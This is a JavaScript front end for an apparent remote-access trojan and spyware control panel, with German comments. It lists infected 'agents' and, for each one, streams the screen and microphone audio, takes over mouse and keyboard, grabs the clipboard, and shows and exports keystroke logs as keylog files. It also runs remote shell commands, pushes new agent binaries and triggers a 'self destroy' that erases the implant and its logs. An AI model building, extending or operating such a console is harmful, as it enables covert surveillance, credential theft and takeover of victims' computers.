// Thin client: der server hÃ¤lt den PSK. Hier nur JSON + binary frames.

const $ = (id) => document.getElementById(id);
const cv = $('cv');
const ctx = cv.getContext('2d', { alpha: false });

let token = localStorage.getItem('rail.token') || '';
let me = null;
let ws = null;
let devices = [];
let activeSlot = 0;
let streaming = false;
let lastFrame = null;   // {bmp,w,h,mon}
let logRows = [];

// ------------------------------------------------------------------ api

async function api(p, opts = {}) {
  const r = await fetch(p, {
    method: opts.method || 'GET',
    headers: { 'content-type': 'application/json', ...(token ? { authorization: 'Bearer ' + token } : {}) },
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  });
  let data = {};
  try { data = await r.json(); } catch { }
  if (r.status === 401) { logout(false); throw new Error('nicht eingeloggt'); }
  if (!r.ok) throw new Error(data.error || ('http ' + r.status));
  return data;
}

function toast(s) {
  const t = $('toast');
  t.textContent = s;
  t.style.display = 'block';
  clearTimeout(t._h);
  t._h = setTimeout(() => { t.style.display = 'none'; }, 2600);
}

// ------------------------------------------------------------------ auth

async function login() {
  const user = $('lu').value.trim();
  const pass = $('lp').value;
  $('lerr').textContent = '';
  try {
    const d = await api('/api/login', { method: 'POST', body: { user, pass } });
    token = d.token;
    localStorage.setItem('rail.token', token);
    me = d;
    start();
  } catch (e) {
    $('lerr').textContent = e.message;
  }
}

function logout(callApi = true) {
  if (callApi && token) api('/api/logout', { method: 'POST' }).catch(() => { });
  token = '';
  me = null;
  localStorage.removeItem('rail.token');
  if (ws) { try { ws.close(); } catch { } ws = null; }
  devices = []; activeSlot = 0; lastFrame = null; logRows = [];
  $('login').style.display = 'flex';
  $('admin').style.display = 'none';
  $('adminBtn').style.display = 'none';
  $('me').textContent = '';
  renderDevices();
  ctx.fillStyle = '#060709'; ctx.fillRect(0, 0, cv.width, cv.height);
}

async function start() {
  $('login').style.display = 'none';
  $('me').textContent = me.user + ' Â· ' + me.role;
  $('adminBtn').style.display = me.role === 'admin' ? 'inline-block' : 'none';
  const canControl = me.role !== 'viewer';
  $('ctl').disabled = !canControl;
  $('wipe').disabled = !canControl;
  $('clear').disabled = !canControl;

  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
  ws = new WebSocket(`${proto}://${location.host}/ws?token=${encodeURIComponent(token)}`);
  ws.binaryType = 'arraybuffer';
  ws.onopen = () => setStatus('verbunden', true);
  ws.onclose = () => setStatus('getrennt', false);
  ws.onmessage = onMessage;
}

function setStatus(s, on) {
  $('st').className = 'dot' + (on ? ' on' : '');
  if (s) $('who').textContent = s;
}

// ------------------------------------------------------------------ messages

function onMessage(ev) {
  if (typeof ev.data === 'string') {
    const m = JSON.parse(ev.data);
    if (m.t === 'dev') { devices = m.devices; renderDevices(); }
    else if (m.t === 'mons') { if (m.slot === activeSlot) renderMonitors(m.items || []); }
    else if (m.t === 'log') { if (m.slot === activeSlot) { logRows = m.items || []; renderLog(logRows); } }
    else if (m.t === 'audit' && me && me.role === 'admin') renderAudit(m.items || []);
    else if (m.t === 'shell') { $('shellOut').textContent = m.out || '(leer)'; }
    else if (m.t === 'clip') { $('astat').textContent = 'clipboard: ' + (m.out || '').slice(0, 120); if (m.out) lastClip = m.out; }
    else if (m.t === 'push') { if (m.ok) toast('chunk ' + m.seq + ' ok'); else toast('push fehler: ' + (m.err || '')); }
    return;
  }

  const buf = new Uint8Array(ev.data);
  if (buf[0] === 2) { playAudio(buf.subarray(5)); return; }   // [2][slot][pcm16]
  if (buf[0] !== 1 || buf.length < 18) return;
  const dv = new DataView(buf.buffer, buf.byteOffset);
  const slot = dv.getUint32(1), w = dv.getInt32(5), h = dv.getInt32(9), mon = dv.getInt32(13);
  if (slot !== activeSlot) return;
  const jpeg = buf.subarray(17);
  createImageBitmap(new Blob([jpeg], { type: 'image/jpeg' })).then((bmp) => {
    if (lastFrame && lastFrame.bmp) lastFrame.bmp.close();
    lastFrame = { bmp, w, h, mon };
    $('idle').style.display = 'none';
    draw();
    $('stats').textContent = `${w} Ã— ${h}   Â·   ${Math.round(jpeg.length / 1024)} kb`;
  }).catch(() => { });
}

// ------------------------------------------------------------------ render

function renderDevices() {
  const box = $('devices');
  $('dcount').textContent = devices.length ? `${devices.length} gerÃ¤t(e)` : '';
  if (!devices.length) { box.innerHTML = '<div class="muted" style="font-size:11px">keine</div>'; return; }
  box.innerHTML = '';
  for (const d of devices) {
    const el = document.createElement('div');
    el.className = 'dev' + (d.slot === activeSlot ? ' sel' : '');
    el.innerHTML = `<span class="d" style="background:${d.online ? 'var(--good)' : '#5a606c'}"></span>
      <span><div class="n">${esc(d.host || 'agent ' + d.slot)}</div>
      <div class="s">${esc(d.user || '?')}${d.keys >= 0 ? ' Â· ' + d.keys + ' zeilen' : ''}</div></span>`;
    el.onclick = () => selectSlot(d.slot);
    box.appendChild(el);
  }
}

function selectSlot(slot) {
  if (slot === activeSlot) return;
  if (streaming && activeSlot) api('/api/ctl', { method: 'POST', body: { slot: activeSlot, ctl: { act: 'stop' } } }).catch(() => { });
  activeSlot = slot;
  streaming = false; lastFrame = null; logRows = [];
  $('idle').style.display = 'flex';
  paintLive(); renderDevices(); renderLog([]);
  ctx.fillStyle = '#060709'; ctx.fillRect(0, 0, cv.width, cv.height);
  if (ws && ws.readyState === 1) ws.send(JSON.stringify({ t: 'sel', slot }));
  const d = devices.find((x) => x.slot === slot);
  if (d) setStatus(`${d.user || '?'} @ ${d.host}`, true);
  api('/api/ctl', { method: 'POST', body: { slot, ctl: { act: 'mons' } } }).catch(() => { });
}

function renderMonitors(items) {
  const sel = $('mon');
  sel.innerHTML = '';
  items.forEach((m, i) => {
    const o = document.createElement('option');
    o.value = String(m.i != null ? m.i : i);
    o.textContent = `${+m.w} Ã— ${+m.h}  ${m.n || ''}`;
    sel.appendChild(o);
  });
  const p = items.findIndex((m) => +m.p === 1);
  if (p >= 0) sel.selectedIndex = p;
  if (items.length && !streaming) startStream();
}

function paintLive() {
  $('live').textContent = streaming ? 'â–  stop' : 'â–¶ live';
  $('live').className = streaming ? 'danger' : 'accent';
}

function draw() {
  const f = lastFrame;
  if (!f) return;
  const cw = cv.clientWidth, ch = cv.clientHeight;
  if (cv.width !== cw || cv.height !== ch) { cv.width = cw; cv.height = ch; }
  const sa = f.w / f.h, ca = cw / ch;
  let w, h;
  if (ca > sa) { h = ch; w = Math.round(h * sa); } else { w = cw; h = Math.round(w / sa); }
  ctx.fillStyle = '#060709';
  ctx.fillRect(0, 0, cw, ch);
  ctx.imageSmoothingEnabled = w <= f.w;
  ctx.drawImage(f.bmp, Math.round((cw - w) / 2), Math.round((ch - h) / 2), w, h);
}

function renderLog(items) {
  const tb = $('rows');
  const rows = items.slice(-4000);
  tb.innerHTML = rows.map((r) => {
    const d = new Date(+r.ts);
    const t = d.toLocaleDateString('de-DE', { day: '2-digit', month: '2-digit' }) + ' ' +
      d.toLocaleTimeString('de-DE', { hour12: false });
    return `<tr><td class="t">${t}</td><td class="w">${esc(r.w || '')}</td><td>${esc(r.t || '')}</td></tr>`;
  }).join('');
  $('lcount').textContent = `${items.length} zeilen`;
  $('log').scrollTop = $('log').scrollHeight;
}

function renderAudit(items) {
  $('audit').innerHTML = items.slice().reverse().map((a) => {
    const d = new Date(a.t);
    return `<div><span class="muted">${d.toLocaleString('de-DE')}</span>  <b>${esc(a.user)}</b>  ${esc(a.what)} <span class="muted">${esc(a.detail)}</span></div>`;
  }).join('');
}

function renderUsers(list) {
  $('urows').innerHTML = list.map((u) => `<tr>
    <td>${esc(u.user)} ${u.online ? '<span class="ok">â€¢</span>' : ''}</td>
    <td><select data-u="${esc(u.user)}" class="role">
      ${['admin', 'operator', 'viewer'].map((r) => `<option ${r === u.role ? 'selected' : ''}>${r}</option>`).join('')}
    </select></td>
    <td><button data-del="${esc(u.user)}">lÃ¶schen</button></td></tr>`).join('');

  document.querySelectorAll('.role').forEach((s) => {
    s.onchange = async () => {
      try { await api('/api/users/role', { method: 'POST', body: { user: s.dataset.u, role: s.value } }); toast('rolle gesetzt'); refreshAdmin(); }
      catch (e) { toast(e.message); }
    };
  });
  document.querySelectorAll('[data-del]').forEach((b) => {
    b.onclick = async () => {
      if (!confirm('account ' + b.dataset.del + ' lÃ¶schen?')) return;
      try { await api('/api/users/delete', { method: 'POST', body: { user: b.dataset.del } }); toast('gelÃ¶scht'); refreshAdmin(); }
      catch (e) { toast(e.message); }
    };
  });
}

function renderSessions(list) {
  $('srows').innerHTML = list.map((s) => `<tr>
    <td>${esc(s.user)} <span class="muted">${esc(s.role)}</span></td>
    <td>${new Date(s.since).toLocaleTimeString('de-DE')}</td>
    <td class="muted">${esc(s.ip || '')}</td>
    <td><button data-kick="${esc(s.user)}">kick</button></td></tr>`).join('');
  document.querySelectorAll('[data-kick]').forEach((b) => {
    b.onclick = async () => {
      try { const r = await api('/api/kick', { method: 'POST', body: { user: b.dataset.kick } }); toast('gekickt: ' + r.kicked); refreshAdmin(); }
      catch (e) { toast(e.message); }
    };
  });
}

async function refreshAdmin() {
  if (!me || me.role !== 'admin') return;
  try {
    const u = await api('/api/users');
    renderUsers(u.users || []);
    const s = await api('/api/sessions');
    renderSessions(s.sessions || []);
    const a = await api('/api/audit');
    renderAudit(a.items || []);
  } catch (e) { toast(e.message); }
}

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
}

// ------------------------------------------------------------------ actions

function startStream() {
  if (!activeSlot) return;
  const idx = Math.max(0, $('mon').selectedIndex);
  const m = $('mon').value;
  api('/api/ctl', {
    method: 'POST', body: {
      slot: activeSlot, ctl: {
        act: 'start', i: +m, q: +$('q').value, fps: +$('fps').value,
        scale: [1, 0.75, 0.5, 0.35][$('scale').selectedIndex].toFixed(2), cur: 1,
      },
    },
  }).catch((e) => toast(e.message));
  streaming = true;
  paintLive();
}

function stopStream() {
  if (activeSlot) api('/api/ctl', { method: 'POST', body: { slot: activeSlot, ctl: { act: 'stop' } } }).catch(() => { });
  streaming = false;
  paintLive();
}

function mapPoint(clientX, clientY) {
  const f = lastFrame;
  if (!f || !activeSlot) return null;
  const r = cv.getBoundingClientRect();
  const cw = r.width, ch = r.height;
  const sa = f.w / f.h, ca = cw / ch;
  let w, h;
  if (ca > sa) { h = ch; w = h * sa; } else { w = cw; h = w / sa; }
  const x = (cw - w) / 2, y = (ch - h) / 2;
  const px = clientX - r.left - x, py = clientY - r.top - y;
  if (px < 0 || py < 0 || px > w || py > h) return null;
  return { slot: activeSlot, i: +$('mon').value || 0, x: Math.round(px / w * f.w), y: Math.round(py / h * f.h) };
}

function input(obj) {
  if (!activeSlot) return;
  api('/api/input', { method: 'POST', body: { slot: activeSlot, input: obj } }).catch(() => { });
}

// ------------------------------------------------------------------ events

$('lbtn').onclick = login;
$('lp').onkeydown = (e) => { if (e.key === 'Enter') login(); };
$('out').onclick = () => logout(true);
$('adminBtn').onclick = () => { $('admin').style.display = 'block'; refreshAdmin(); };
$('adminClose').onclick = () => { $('admin').style.display = 'none'; };
$('nadd').onclick = async () => {
  try {
    await api('/api/users', { method: 'POST', body: { user: $('nu').value, pass: $('np').value, role: $('nr').value } });
    $('nu').value = ''; $('np').value = '';
    toast('account angelegt');
    refreshAdmin();
  } catch (e) { toast(e.message); }
};

$('q').oninput = () => { $('qv').textContent = $('q').value; };
$('scan').onclick = () => activeSlot && api('/api/ctl', { method: 'POST', body: { slot: activeSlot, ctl: { act: 'mons' } } }).catch(() => { });
$('mon').onchange = () => { if (streaming) startStream(); };
$('fps').onchange = () => { if (streaming) startStream(); };
$('scale').onchange = () => { if (streaming) startStream(); };
$('q').onchange = () => { if (streaming) startStream(); };
$('live').onclick = () => { if (streaming) stopStream(); else startStream(); };
$('rel').onclick = () => input({ t: 'r' });

$('query').onclick = async () => {
  if (!activeSlot) return;
  try { await api('/api/log?slot=' + activeSlot + '&q=' + encodeURIComponent($('q2').value) + '&n=100000'); }
  catch (e) { toast(e.message); }
};
$('q2').onkeydown = (e) => { if (e.key === 'Enter') $('query').click(); };

$('export').onclick = async () => {
  if (!activeSlot) return;
  try {
    await api('/api/log?slot=' + activeSlot + '&q=&n=100000');
    const wait = setInterval(() => {
      if (!logRows.length) return;
      clearInterval(wait);
      writeExport(logRows);
    }, 300);
    setTimeout(() => clearInterval(wait), 8000);
  } catch (e) { toast(e.message); }
};

function writeExport(items) {
  const d0 = devices.find((d) => d.slot === activeSlot) || {};
  const head = ['# rail export', '# geraet: ' + (d0.host || '?'), '# benutzer: ' + (d0.user || '?'),
    '# exportiert: ' + new Date().toISOString(), '# zeilen: ' + items.length,
    'datum\tzeit\tfenster\ttext'].join('\r\n');
  const lines = items.map((r) => {
    const d = new Date(+r.ts);
    return d.toLocaleDateString('sv-SE') + '\t' + d.toLocaleTimeString('sv-SE', { hour12: false }) +
      '\t' + (r.w || '') + '\t' + (r.t || '');
  });
  const blob = new Blob(['\ufeff' + head + '\r\n' + lines.join('\r\n')], { type: 'text/tab-separated-values' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'keylog_' + new Date().toISOString().replace(/[:.]/g, '-') + '.tsv';
  a.click();
  setTimeout(() => URL.revokeObjectURL(a.href), 5000);
}

$('clear').onclick = async () => {
  if (!activeSlot) return;
  const d = devices.find((x) => x.slot === activeSlot) || {};
  if (!confirm('Tastenlog auf ' + (d.host || 'dem gerÃ¤t') + ' komplett lÃ¶schen?')) return;
  try { await api('/api/clear', { method: 'POST', body: { slot: activeSlot } }); logRows = []; renderLog([]); toast('log geleert'); }
  catch (e) { toast(e.message); }
};

$('wipe').onclick = async () => {
  if (!activeSlot) return;
  const d = devices.find((x) => x.slot === activeSlot) || {};
  const who = (d.host || 'gerÃ¤t') + '  (' + (d.user || '?') + ')';
  if (!confirm('SELF DESTROY â€” Schritt 1 von 3\n\nZiel: ' + who + '\n\nEntfernt dienst, ordner, tastenlog, programmdatei.\n\nWeiter?')) return;
  if (!confirm('SELF DESTROY â€” Schritt 2 von 3\n\nAuch der tastenlog verschwindet endgÃ¼ltig.\n\nWirklich?')) return;
  if (!confirm('SELF DESTROY â€” Schritt 3 von 3, letzte frage\n\nNicht rÃ¼ckgÃ¤ngig. ' + who + ' meldet sich danach nicht mehr.\n\nJETZT ausfÃ¼hren?')) return;
  try { await api('/api/wipe', { method: 'POST', body: { slot: activeSlot } }); toast('self destroy gesendet'); }
  catch (e) { toast(e.message); }
};

cv.addEventListener('mousemove', (e) => {
  if (!$('ctl').checked) return;
  const m = mapPoint(e.clientX, e.clientY);
  if (m) input({ t: 'm', i: m.i, x: m.x, y: m.y });
});
cv.addEventListener('mousedown', (e) => {
  cv.focus();
  if (!$('ctl').checked) return;
  const m = mapPoint(e.clientX, e.clientY);
  if (!m) return;
  input({ t: 'b', i: m.i, x: m.x, y: m.y, b: e.button === 2 ? 2 : e.button === 1 ? 1 : 0, d: 1 });
});
cv.addEventListener('mouseup', (e) => {
  if (!$('ctl').checked) return;
  input({ t: 'b', b: e.button === 2 ? 2 : e.button === 1 ? 1 : 0, d: 0 });
});
cv.addEventListener('contextmenu', (e) => e.preventDefault());
cv.addEventListener('wheel', (e) => {
  if (!$('ctl').checked) return;
  e.preventDefault();
  input({ t: 'w', d: Math.round(e.deltaY) });
}, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!$('ctl').checked) return;
  const tag = (e.target.tagName || '').toLowerCase();
  if (tag === 'input' || tag === 'select' || tag === 'textarea') return;
  e.preventDefault();
  input({ t: 'k', vk: e.keyCode, d: 1 });
});
document.addEventListener('keyup', (e) => {
  if (!$('ctl').checked) return;
  const tag = (e.target.tagName || '').toLowerCase();
  if (tag === 'input' || tag === 'select' || tag === 'textarea') return;
  input({ t: 'k', vk: e.keyCode, d: 0 });
});
window.addEventListener('resize', () => draw());

// boot: token vorhanden? dann direkt rein
if (token) {
  api('/api/me').then((m) => { me = m; start(); }).catch(() => { token = ''; localStorage.removeItem('rail.token'); });
} else {
  $('login').style.display = 'flex';
}

// ================================================================== tabs
document.querySelectorAll('#tabs button').forEach((b) => {
  b.onclick = () => {
    document.querySelectorAll('#tabs button').forEach((x) => x.classList.remove('on'));
    document.querySelectorAll('.pane').forEach((x) => x.classList.remove('on'));
    b.classList.add('on');
    const p = document.getElementById('pane-' + b.dataset.pane);
    if (p) p.classList.add('on');
  };
});

// ================================================================== audio
let actx = null, again = null, atime = 0, abytes = 0, achunks = 0, audioOn = false, lastClip = '';

function playAudio(pcm) {
  if (!audioOn || !actx) return;
  abytes += pcm.length; achunks++;
  if (achunks % 20 === 0) $('astat').textContent = (abytes / 1024 | 0) + ' KB empfangen';

  const n = pcm.length >> 1;
  const buf = actx.createBuffer(1, n, actx.sampleRate);
  const ch = buf.getChannelData(0);
  const dv = new DataView(pcm.buffer, pcm.byteOffset);
  for (let i = 0; i < n; i++) ch[i] = dv.getInt16(i * 2, true) / 32768;

  const src = actx.createBufferSource();
  src.buffer = buf;
  src.connect(again);
  const now = actx.currentTime;
  if (atime < now + 0.05) atime = now + 0.05;   // unterlauf -> neu aufsetzen
  if (atime > now + 1.2) { toast('ton-puffer zu groß, rücksetzen'); atime = now + 0.1; }
  src.start(atime);
  atime += buf.duration;
}

async function toggleAudio() {
  if (audioOn) {
    audioOn = false;
    await api('/api/ctl', { method: 'POST', body: { slot: activeSlot, ctl: { act: 'audio', on: 0 } } }).catch(() => { });
    if (actx) { try { actx.close(); } catch { } actx = null; }
    $('audio').textContent = '? ton an'; $('audio').className = 'accent f1';
    $('astat').textContent = '—';
    return;
  }
  if (!activeSlot) { toast('gerät wählen'); return; }
  const rate = +$('arate').value;
  try { actx = new AudioContext({ sampleRate: rate }); } catch { actx = new AudioContext(); }
  again = actx.createGain();
  again.gain.value = (+$('vol').value) / 100;
  again.connect(actx.destination);
  atime = 0; abytes = 0; achunks = 0; audioOn = true;
  await api('/api/ctl', { method: 'POST', body: { slot: activeSlot, ctl: { act: 'audio', on: 1, rate } } }).catch(() => { });
  $('audio').textContent = '¦ ton aus'; $('audio').className = 'danger f1';
  $('astat').textContent = 'wartet auf audio…';
}

$('audio').onclick = toggleAudio;
$('vol').oninput = () => { $('volv').textContent = $('vol').value; if (again) again.gain.value = (+$('vol').value) / 100; };

// ================================================================== pad
const pad = $('pad');
let padDown = false, padLast = null, padMoved = false;
pad.addEventListener('pointerdown', (e) => {
  if (!activeSlot) return;
  padDown = true; padLast = { x: e.clientX, y: e.clientY }; padMoved = false;
  pad.setPointerCapture(e.pointerId);
});
pad.addEventListener('pointermove', (e) => {
  if (!padDown || !activeSlot) return;
  const dx = Math.round((e.clientX - padLast.x) * 2);
  const dy = Math.round((e.clientY - padLast.y) * 2);
  padLast = { x: e.clientX, y: e.clientY };
  if (dx || dy) { padMoved = true; input({ t: 'mr', dx, dy }); }
});
pad.addEventListener('pointerup', () => {
  if (padDown && !padMoved && activeSlot) { input({ t: 'b', b: 0, d: 1 }); input({ t: 'b', b: 0, d: 0 }); }
  padDown = false;
});

document.querySelectorAll('[data-mb]').forEach((b) => {
  b.onclick = () => {
    if (!activeSlot) return;
    input({ t: 'b', b: +b.dataset.mb, d: 1 });
    input({ t: 'b', b: +b.dataset.mb, d: 0 });
  };
});
$('whUp').onclick = () => activeSlot && input({ t: 'w', d: 120 });
$('whDn').onclick = () => activeSlot && input({ t: 'w', d: -120 });

// ================================================================== quick keys
function tapVk(vk) {
  if (!activeSlot) return;
  input({ t: 'k', vk, d: 1 });
  input({ t: 'k', vk, d: 0 });
}
function combo(name) {
  if (!activeSlot) return;
  const combos = {
    'alt-tab': [[0xA4, 1], [0x09, 1], [0x09, 0], [0xA4, 0]],
    'win-d': [[0x5B, 1], [0x44, 1], [0x44, 0], [0x5B, 0]],
    'win-l': [[0x5B, 1], [0x4C, 1], [0x4C, 0], [0x5B, 0]],
    'taskmgr': [[0xA2, 1], [0xA0, 1], [0x1B, 1], [0x1B, 0], [0xA0, 0], [0xA2, 0]],
  };
  (combos[name] || []).forEach(([vk, d]) => input({ t: 'k', vk, d }));
}
document.querySelectorAll('[data-vk]').forEach((b) => { b.onclick = () => tapVk(+b.dataset.vk); });
document.querySelectorAll('[data-combo]').forEach((b) => { b.onclick = () => combo(b.dataset.combo); });

// ================================================================== on-screen keyboard
const KEYS = [
  ['1', 49], ['2', 50], ['3', 51], ['4', 52], ['5', 53], ['6', 54], ['7', 55], ['8', 56], ['9', 57], ['0', 48],
  ['q', 81], ['w', 87], ['e', 69], ['r', 82], ['t', 84], ['z', 90], ['u', 85], ['i', 73], ['o', 79], ['p', 80],
  ['a', 65], ['s', 83], ['d', 68], ['f', 70], ['g', 71], ['h', 72], ['j', 74], ['k', 75], ['l', 76], ['ß', 219],
  ['y', 89], ['x', 88], ['c', 67], ['v', 86], ['b', 66], ['n', 78], ['m', 77], [',', 188], ['.', 190], ['-', 189],
  ['shift', 160], ['ctrl', 162], ['alt', 164], ['space', 32], ['enter', 13], ['bksp', 8], ['esc', 27], ['tab', 9],
  ['?', 37], ['?', 38], ['?', 40], ['?', 39], ['pos1', 36], ['ende', 35], ['entf', 46], ['win', 91],
];
const kbd = $('kbd');
if (kbd) {
  KEYS.forEach(([label, vk]) => {
    const b = document.createElement('button');
    b.textContent = label;
    b.onclick = () => tapVk(vk);
    kbd.appendChild(b);
  });
}

// ================================================================== live typing
$('typ').addEventListener('keydown', (e) => {
  if (!activeSlot) return;
  const special = { Backspace: 8, Enter: 13, Tab: 9, Escape: 27, Delete: 46, ArrowLeft: 37, ArrowUp: 38, ArrowRight: 39, ArrowDown: 40 };
  if (special[e.key] != null) {
    e.preventDefault();
    tapVk(special[e.key]);
    return;
  }
  if (e.ctrlKey || e.altKey) {
    e.preventDefault();
    if (e.key.length === 1) {
      if (e.ctrlKey) input({ t: 'k', vk: 162, d: 1 });
      if (e.altKey) input({ t: 'k', vk: 164, d: 1 });
      const vk = e.key.toUpperCase().charCodeAt(0);
      tapVk(vk);
      if (e.altKey) input({ t: 'k', vk: 164, d: 0 });
      if (e.ctrlKey) input({ t: 'k', vk: 162, d: 0 });
    }
    return;
  }
  if (e.key.length === 1) {
    e.preventDefault();
    input({ t: 'x', s: e.key });
  }
});
$('paste').onclick = async () => {
  if (!activeSlot) return;
  const text = lastClip || await navigator.clipboard.readText().catch(() => '');
  if (!text) { toast('keine zwischenablage'); return; }
  input({ t: 'x', s: text });
  toast(text.length + ' zeichen gesendet');
};
$('clipGet').onclick = () => {
  if (!activeSlot) return;
  api('/api/clip', { method: 'POST', body: { slot: activeSlot, act: 'get', id: 'c1' } }).catch((e) => toast(e.message));
};

// ================================================================== shell
async function runShell(cmd) {
  if (!activeSlot || !cmd) return;
  $('shellOut').textContent = '… läuft';
  try {
    await api('/api/shell', { method: 'POST', body: { slot: activeSlot, cmd, shell: $('shtype').value, id: String(Date.now()) } });
  } catch (e) { $('shellOut').textContent = e.message; }
}
$('shrun').onclick = () => runShell($('shcmd').value);
$('shcmd').onkeydown = (e) => { if (e.key === 'Enter') $('shrun').click(); };
document.querySelectorAll('[data-sh]').forEach((b) => {
  b.onclick = () => {
    if (b.classList.contains('danger') && !confirm(b.dataset.sh + '  ausführen?')) return;
    runShell(b.dataset.sh);
  };
});

// ================================================================== agent update
$('upd').onclick = () => {
  if (!activeSlot) { toast('gerät wählen'); return; }
  if (!confirm('Neuen agent auf dieses gerät schieben?\n\nDie laufende exe wird ersetzt und der dienst neu gestartet.')) return;
  $('updfile').click();
};
$('updfile').onchange = async (e) => {
  const f = e.target.files[0];
  if (!f) return;
  const buf = await f.arrayBuffer();
  const all = new Uint8Array(buf);
  const CH = 192 * 1024;
  const total = Math.ceil(all.length / CH);
  toast('upload: ' + total + ' blöcke, ' + Math.round(all.length / 1024) + ' KB');
  for (let i = 0; i < total; i++) {
    const slice = all.subarray(i * CH, Math.min((i + 1) * CH, all.length));
    let bin = '';
    for (let j = 0; j < slice.length; j++) bin += String.fromCharCode(slice[j]);
    await api('/api/push', {
      method: 'POST',
      body: { slot: activeSlot, seq: i, last: i === total - 1, data: btoa(bin), name: f.name },
    }).catch((err) => toast('block ' + i + ': ' + err.message));
  }
  toast('fertig — der dienst tauscht sich jetzt selbst');
  e.target.value = '';
};
